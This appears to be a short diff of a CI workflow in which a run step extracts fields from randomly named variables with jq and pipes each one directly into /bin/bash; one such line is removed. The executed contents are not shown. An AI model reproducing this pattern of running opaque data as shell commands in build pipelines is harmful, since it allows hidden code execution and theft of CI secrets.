@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$in4" | jq -r .ki551 | /bin/bash
           echo $ef979 | jq -r .oysl022 | /bin/bash
-          printf '%s' "$jstp00" | jq -r .aq8 | /bin/bash
           printf '%s' "$xkvke637" | jq -r .cf37 | /bin/bash
 
       - name: Upload results
